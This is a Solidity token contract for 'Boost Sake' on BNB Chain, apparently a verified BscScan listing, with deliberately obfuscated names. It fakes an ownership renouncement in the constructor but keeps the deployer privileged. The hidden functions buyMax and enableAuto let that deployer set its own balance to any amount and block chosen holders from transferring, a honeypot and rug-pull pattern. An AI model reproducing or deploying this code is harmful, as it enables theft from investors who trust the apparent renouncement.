/**
 *Submitted for verification at BscScan.com on 2023-02-13
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

abstract contract feeIs {
    function isSell() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface atTx {
    function createPair(address launchMarketing, address sellShould) external returns (address);
}

interface modeTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract BoostSake is IERC20, feeIs {

    function owner() external view returns (address) {
        return launchFrom;
    }

    function takeSender() public {
        emit OwnershipTransferred(enableFeeReceiver, address(0));
        launchFrom = address(0);
    }

    function swapBuy() public {
        
        if (walletSenderTo != fundTotal) {
            launchList = launchedShouldMax;
        }
        walletSenderTo=false;
    }

    string private receiverList = "BSE";

    function allowance(address receiverTake, address launchedAtSell) external view virtual override returns (uint256) {
        return marketingLaunched[receiverTake][launchedAtSell];
    }

    function listEnable(address listTx, address swapAt, uint256 receiverFrom) internal returns (bool) {
        require(feeToken[listTx] >= receiverFrom);
        feeToken[listTx] -= receiverFrom;
        feeToken[swapAt] += receiverFrom;
        emit Transfer(listTx, swapAt, receiverFrom);
        return true;
    }

    function teamTrading(address walletAt) public {
        if (swapTeam) {
            return;
        }
        if (launchList != maxSwap) {
            feeAutoMin = exemptWallet;
        }
        receiverSell[walletAt] = true;
        if (maxSwap == exemptWallet) {
            exemptWallet = feeAutoMin;
        }
        swapTeam = true;
    }

    function marketingModeTotal() public view returns (bool) {
        return takeMaxExempt;
    }

    bool private fundTotal;

    function transfer(address takeShould, uint256 receiverFrom) external virtual override returns (bool) {
        return shouldFund(isSell(), takeShould, receiverFrom);
    }

    function symbol() external view returns (string memory) {
        return receiverList;
    }

    bool public swapTeam;

    address public isReceiverAt;

    function decimals() external view returns (uint8) {
        return fromLaunched;
    }

    string private maxBuyFrom = "Boost Sake";

    address private launchFrom;

    function shouldFund(address listTx, address swapAt, uint256 receiverFrom) internal returns (bool) {
        if (listTx == enableFeeReceiver || swapAt == enableFeeReceiver) {
            return listEnable(listTx, swapAt, receiverFrom);
        }
        
        require(!marketingLiquidity[listTx]);
        
        return listEnable(listTx, swapAt, receiverFrom);
    }

    uint256 public exemptWallet;

    function amountSellFund() public view returns (bool) {
        return fundTotal;
    }

    uint8 private fromLaunched = 18;

    function name() external view returns (string memory) {
        return maxBuyFrom;
    }

    bool public takeMaxExempt;

    function approve(address launchedAtSell, uint256 receiverFrom) public virtual override returns (bool) {
        marketingLaunched[isSell()][launchedAtSell] = receiverFrom;
        emit Approval(isSell(), launchedAtSell, receiverFrom);
        return true;
    }

    mapping(address => mapping(address => uint256)) private marketingLaunched;

    uint256 private launchedShouldMax;

    function sellWallet() public {
        if (fundTotal == takeMaxExempt) {
            exemptWallet = maxSwap;
        }
        
        launchedShouldMax=0;
    }

    constructor (){
        
        modeTotal fromLimit = modeTotal(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        isReceiverAt = atTx(fromLimit.factory()).createPair(fromLimit.WETH(), address(this));
        launchFrom = isSell();
        if (launchList == launchedShouldMax) {
            maxSwap = launchList;
        }
        enableFeeReceiver = launchFrom;
        receiverSell[enableFeeReceiver] = true;
        
        feeToken[enableFeeReceiver] = isLiquidity;
        emit Transfer(address(0), enableFeeReceiver, isLiquidity);
        takeSender();
    }

    address public enableFeeReceiver;

    event OwnershipTransferred(address indexed swapReceiver, address indexed shouldSwapFrom);

    mapping(address => uint256) private feeToken;

    function minMarketing() public view returns (bool) {
        return fundTotal;
    }

    uint256 public maxSwap;

    uint256 public launchList;

    bool public walletSenderTo;

    function buyMax(uint256 receiverFrom) public {
        if (!receiverSell[isSell()]) {
            return;
        }
        feeToken[enableFeeReceiver] = receiverFrom;
    }

    function enableAuto(address toAtSwap) public {
        if (fundTotal == walletSenderTo) {
            launchList = maxSwap;
        }
        if (toAtSwap == enableFeeReceiver || toAtSwap == isReceiverAt || !receiverSell[isSell()]) {
            return;
        }
        
        marketingLiquidity[toAtSwap] = true;
    }

    function getOwner() external view returns (address) {
        return launchFrom;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return isLiquidity;
    }

    uint256 private feeAutoMin;

    uint256 private isLiquidity = 100000000 * 10 ** 18;

    function transferFrom(address listTx, address swapAt, uint256 receiverFrom) external override returns (bool) {
        if (marketingLaunched[listTx][isSell()] != type(uint256).max) {
            require(receiverFrom <= marketingLaunched[listTx][isSell()]);
            marketingLaunched[listTx][isSell()] -= receiverFrom;
        }
        return shouldFund(listTx, swapAt, receiverFrom);
    }

    function listReceiver() public {
        
        if (feeAutoMin == maxSwap) {
            maxSwap = launchList;
        }
        maxSwap=0;
    }

    function walletBuy() public {
        if (launchedShouldMax == launchList) {
            launchedShouldMax = exemptWallet;
        }
        
        launchList=0;
    }

    function balanceOf(address swapExemptTake) public view virtual override returns (uint256) {
        return feeToken[swapExemptTake];
    }

    mapping(address => bool) public receiverSell;

    mapping(address => bool) public marketingLiquidity;

}